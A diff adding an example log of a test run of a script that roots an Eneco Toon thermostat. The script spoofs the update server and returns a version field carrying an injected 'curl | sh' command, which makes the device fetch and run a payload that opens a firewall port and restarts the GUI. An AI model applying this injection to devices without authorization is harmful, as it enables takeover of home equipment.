@@ -1,0 +1,103 @@
+This is an example of a test run to check if you can root this Toon.
+When everything is fine you should get 2 messages on your Toon and the GUI should restart.
+
+The next starts the script :
+$ sudo bash root-toon.sh test
+
+Output of the script which may be a little bit different for you :
+
+Performing test : show 2 messages on Toon and restart GUI
+
+Make sure your Toon is connected to my wifi and restart your Toon.
+
+(left top corner, Instellingen, Software, Herstart, Herstart)
+
+Press Enter when you see the progress bar on your Toon.
+After your Toon contacted the service center you will see messages below.
+
+When you see a message below press buttons on Toon :
+  - Press the home button in top left corner.
+  - Press Instellingen.
+  - Press Software
+and watch the magic happen....
+
+Waiting for Toon to contact the servicecenter........
+
+Do not touch your Toon while waiting, first wait for me to proceed !
+
+The Toon from 10.42.0.18 is connecting to servicecenter IP: 172.29.16.1
+-------------------------------------------------------
+POST /benchmark/friendRequest HTTP/1.1
+Host: 172.29.16.1:31080
+Accept: */*
+Content-Type: application/xml; charset=utf-8
+Content-Length: 536
+
+<action class="invoke" uuid="eneco-001-338590:happ_pwrusage" destuuid="0adc8160-fdb4-11e2-b778-0800200c9a66" serviceid="urn:hcb-hae-com:serviceId:specific1" requestid="744-15" commonname="eneco-001-338590">
+    <u:getFriendRequests xmlns:u="urn:hcb-hae-com:service:specific1:1"><type>pendingRequestsMadeByMe</type>
+   <type>requestsWaitingOnMe</type>
+   <type>activeFriendships</type>
+   <type>endedFriendships</type>
+   <retries>0</retries>
+   <requestId>744-15</requestId>
+   <timeout>30</timeout>
+    </u:getFriendRequests>
+</action>This is not a update request.
+-------------------------------------------------------
+POST /QubyRegistration/ HTTP/1.1
+Host: 172.29.16.1:31080
+Accept: */*
+Content-Type: application/xml; charset=utf-8
+Content-Length: 444
+
+<action class="invoke" uuid="eneco-001-338590:hcb_config" destuuid="0429a450-bd0c-11e0-962b-0800200c9a66" serviceid="urn:hcb-hae-com:serviceId:specific1" requestid="754-0" commonname="eneco-001-338590">
+    <u:GetUpgrade xmlns:u="http://schema.homeautomationeurope.com/quby"><Arch>qb2</Arch>
+   <Flav>uni</Flav>
+   <Ver>5.0.6</Ver>
+   <Seed>475957524</Seed>
+   <requestId>754-0</requestId>
+   <timeout>10</timeout>
+    </u:GetUpgrade>
+</action>
+-------------------------------------------------------
+Received valid update request.
+Starting payload process in background.
+-------------------------------------------------------
+#!/bin/sh iptables -I HCB-INPUT -p tcp --dport 80 -j ACCEPT ; echo "We have connection" > /qmf/www/rsrc/log ; echo "Do not touch the screen of your Toon" >> /qmf/www/rsrc/log ; echo "Just wait and look at your Toon to see the GUI restart" >> /qmf/www/rsrc/log ; /qmf/bin/bxt -d :happ_usermsg -s Notification -n CreateNotification -a type -v task -a subType -v notify -a text -v "Restarting your GUI" 2>/dev/null >/dev/null ; sleep 2 ; /qmf/bin/bxt -d :happ_usermsg -s Notification -n CreateNotification -a type -v task -a subType -v notify -a text -v "Please wait..." 2>/dev/null >/dev/null ; sleep 2 ; killall -9 qt-gui ; echo "### Reached End Of Job ###" >> /qmf/www/rsrc/log
+-------------------------------------------------------
+Sending the reponse for the upgrade request.
+-------------------------------------------------------
+HTTP/1.1 200 OK
+
+ <action xmlns:u="http://schema.homeautomationeurope.com/quby" class="response" uuid="0429a450-bd0c-11e0-962b-0800200c9a66" destuuid="eneco-001-338590:hcb_config" destcommonname="eneco-001-338590" requestid="754-0" serviceid="urn:hcb-hae-com:serviceId:specific1">
+ <u:GetUpgradeResponse xmlns:u="http://schema.homeautomationeurope.com/quby">
+ <DoUpgrade>true</DoUpgrade>
+ <Ver>5.;curl 1.1|sh;;</Ver>
+ <Success>true</Success>
+ <Reason>Success</Reason>
+ <ReasonDetails>Success</ReasonDetails>
+ </u:GetUpgradeResponse>
+ </action>
+
+-------------------------------------------------------
+The payload and response have been sent.
+Now waiting for the Toon to pick up the payload.
+Depending on the firmware of the Toon this can take a minute or so.
+
+ .... Please wait......
+
+GET / HTTP/1.1
+Host: 1.1
+User-Agent: curl/7.50.0
+Accept: */*
+
+Done sending the payload! Following the toon root log file now to see progress
+We have connection
+Do not touch the screen of your Toon
+Just wait and look at your Toon to see the GUI restart
+-------------------------------------------------------
+We have connection
+Do not touch the screen of your Toon
+Just wait and look at your Toon to see the GUI restart
+### Reached End Of Job ###
+-------------------------------------------------------
